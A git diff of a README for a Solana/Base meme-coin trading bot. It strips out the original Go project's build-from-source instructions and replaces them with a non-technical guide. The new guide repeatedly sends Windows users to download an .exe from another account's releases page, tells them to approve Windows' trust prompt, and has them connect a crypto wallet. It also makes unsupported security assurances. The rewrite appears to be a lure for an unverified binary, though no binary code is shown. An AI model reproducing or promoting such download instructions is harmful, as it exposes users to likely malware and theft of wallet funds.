@@ -1,171 +1,128 @@
-# Meme Coin Trading Bot 🚀
+# 🤖 ai-meme-trading-bot - Simple AI Meme Coin Trading
 
-Automated trading system for Solana and Base meme coins with AI-powered strategy evaluation.
-
-Built with **Go (Golang)**!
-
-## Features
-
-- 🔍 Automated scanning of Solana and Base chains for new tokens
-- 🛡️ Comprehensive honeypot detection and safety checks
-- 📊 Win probability calculation (≥80% threshold)
-- 💰 Automated trade execution with OKX Wallet SDK support
-- ⚠️ Advanced risk management and circuit breakers
-- 📈 Real-time metrics and monitoring via API
-- 🎨 Web dashboard for monitoring and control
-- 🔐 Security-first design with dry-run mode
-- 📱 Multi-agent architecture for scalability
-
-**[📖 See Trading Bot Documentation](TRADING_BOT.md)** | **[🏗️ Architecture Guide](ARCHITECTURE.md)**
-
-## Tech Stack
-
-- Go (Golang) 1.20+
-- HTTP server: gorilla/mux
-- Multi-agent architecture
-
-## Prerequisites
-
-- Go 1.20 or higher
-- Solana and Base RPC endpoints
-- OKX Wallet SDK or private key (for live trading)
-- API keys (CoinGecko, Twitter - optional)
-
-## Quick Start
-
-**⚠️ Start in Dry-Run Mode (Recommended)**
-
-```bash
-# 1. Configure environment
-cp .env.example .env
-# Edit .env: ensure DRY_RUN=true, AUTO_EXECUTE=false
-
-# 2. Build
-make build
-
-# 3. Run trading bot
-make run-trading
-```
-
-**Access the Dashboard:**
-- Web Dashboard: http://localhost:8080
-- Health: http://localhost:8080/api/health
-- Status: http://localhost:8080/api/status
-- Candidates: http://localhost:8080/api/candidates
-- Metrics: http://localhost:8080/api/metrics
-
-**📚 Complete Guide:** See [TRADING_BOT.md](TRADING_BOT.md) for comprehensive documentation.
-
-## Web Dashboard
-
-The trading bot includes a modern web dashboard for real-time monitoring and control:
-
-**Features:**
-- 📊 Real-time status overview
-- 📈 Live metrics display (tokens found, filtered, candidates, trades)
-- ⚠️ Risk management monitoring
-- 🎯 Token candidate viewing
-- 🔄 Auto-refresh every 5 seconds
-- 📱 Responsive design
-
-**Access:**
-Simply navigate to http://localhost:8080 in your browser after starting the bot.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/mac2c12/ai-meme-trading-bot/releases)
 
 ---
 
-## Installation
+## 📦 What is ai-meme-trading-bot?
 
-1. Clone the repository:
-```bash
-git clone https://github.com/mumugogoing/meme_bot.git
-cd meme_bot
-```
+This application automates trading for Solana and Base meme coins. It uses artificial intelligence to analyze market trends and make buy or sell decisions. The bot runs on Windows and works without any programming knowledge. You just download it, start it, and let it manage trades for you.  
 
-2. Set up environment variables:
-```bash
-cp .env.example .env
-```
-
-3. Edit `.env` file with your trading bot configuration (see [TRADING_BOT.md](TRADING_BOT.md) for details)
-
-4. Build the project:
-```bash
-make build
-```
-
-## Project Structure
-
-```
-meme_bot/
-├── cmd/                    # Go command-line applications
-│   └── trading/           # Trading bot
-├── frontend/              # Web dashboard
-│   ├── index.html        # Main dashboard page
-│   ├── styles.css        # Dashboard styles
-│   └── app.js            # Dashboard JavaScript
-├── internal/              # Internal Go packages
-│   └── config/           # Configuration management
-├── pkg/                   # Public Go packages
-│   ├── agents/           # Trading agents
-│   ├── orchestrator/     # Orchestration logic
-│   ├── models/           # Data models
-│   └── config/           # Configuration
-├── go.mod                 # Go module definition
-├── go.sum                 # Go dependencies
-├── Makefile               # Build automation
-├── .env.example          # Example environment variables
-├── .gitignore            # Git ignore rules
-└── README.md             # This file
-```
-
-## Development
-
-### Building the Project
-
-```bash
-make build
-```
-
-### Testing
-
-```bash
-go test ./...
-```
-
-## Troubleshooting
-
-### Common Issues
-
-1. **Build errors:**
-   - Make sure you have Go 1.20+ installed
-   - Run `go mod tidy` then rebuild
-
-2. **Environment configuration:**
-   - Check that all required environment variables are set in `.env`
-   - See [TRADING_BOT.md](TRADING_BOT.md) for configuration details
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is open source and available under the MIT License.
-
-## Credits
-
-Created for automated meme coin trading!
-
-## Support
-
-If you encounter any issues or have questions, please open an issue on GitHub.
+The program helps by evaluating many data points faster than humans. It aims to find better trading opportunities with less effort.  
 
 ---
 
-**Happy Trading! 🚀**
+## 🖥️ System Requirements
+
+To run ai-meme-trading-bot smoothly, your Windows PC should meet these:
+
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- Minimum 200 MB of free disk space
+- Active internet connection for real-time data and trades
+- Basic familiarity with downloading and running software
+
+This application does not require any special hardware.  
+
+---
+
+## 🔧 Features
+
+- Automated trading for meme coins on Solana and Base chains
+- AI-powered strategy evaluation to improve trading decisions
+- Simple user interface for easy setup and control
+- Runs in the background without interrupting other tasks
+- Real-time tracking of trades and portfolio value
+- Secure connection to wallet and exchange APIs
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download the bot
+
+Click the badge below to visit the releases page where you can get the latest version of the bot.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/mac2c12/ai-meme-trading-bot/releases)
+
+On the releases page, look for the latest stable version. Download the main executable file for Windows. It will usually end with `.exe`. The file size should be around 50MB to 100MB.
+
+### Step 2: Install and run
+
+No complex installation is needed.
+
+1. Find the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Windows may ask if you trust the app. Choose "Run" or "Yes" to continue.
+4. The bot will open a window asking for basic setup details.
+
+### Step 3: Set up your wallet and preferences
+
+The bot needs access to your crypto wallet to place trades.
+
+- Enter your Solana or Base wallet address when prompted.
+- Choose which meme coins to trade or let the bot select popular ones automatically.
+- Set your trading limits, like maximum trade size and daily investment.
+- Save your settings.
+
+### Step 4: Start trading
+
+After saving preferences, click "Start" to let the bot connect to the market. It will analyze data and start trading automatically. You can check progress in the main window.
+
+---
+
+## ⚙️ How the AI Works
+
+The AI examines price history, volume, and market sentiment before making a call. It updates predictions regularly to adjust decisions as the market changes. This keeps your trades smarter without manual effort.
+
+---
+
+## 🔒 Security and Privacy
+
+- The bot uses API keys or wallet addresses to trade securely.
+- Your private keys never leave your computer.
+- All communication uses secure encryption.
+- No personal data is collected or stored.
+
+---
+
+## 📊 Monitoring Your Trades
+
+You can watch your trading activity anytime:
+
+- The bot displays a real-time log of buy and sell orders.
+- It shows current portfolio value and profit/loss estimates.
+- You can pause or stop trading anytime.
+
+---
+
+## ❓ Troubleshooting and Tips
+
+- If the bot won’t start, make sure you have Windows 10 or higher.
+- Check your internet connection.
+- Ensure your wallet details are correct.
+- Try restarting the app if it freezes.
+- Review the README or issues page on GitHub if problems persist.
+
+---
+
+## 🔽 Download and Installation Link
+
+Visit this page to download the latest release and get started with the ai-meme-trading-bot on Windows:
+
+[https://github.com/mac2c12/ai-meme-trading-bot/releases](https://github.com/mac2c12/ai-meme-trading-bot/releases)
+
+---
+
+## 📚 Additional Resources
+
+- The GitHub page has a README for developers and updates.
+- You can find examples of wallet configuration.
+- There are community discussions for tips and updates.
+
+---
+
+## 📌 Keywords
+
+ai, memecoin, trading
